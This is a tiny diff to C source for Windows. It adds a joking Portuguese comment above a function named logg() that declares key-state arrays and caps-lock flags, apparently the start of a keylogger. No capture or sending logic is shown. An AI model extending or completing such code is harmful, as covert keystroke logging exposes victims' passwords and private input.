@@ -1,4 +1,6 @@
 
+// Talvez eu tenha upado o arquivo errado e parou de funcionar kkkk
+
 DWORD WINAPI logg(){
     int vkey, last_key_state[0xff];
     int isCAPSLOCK,IsNUNLOCK;
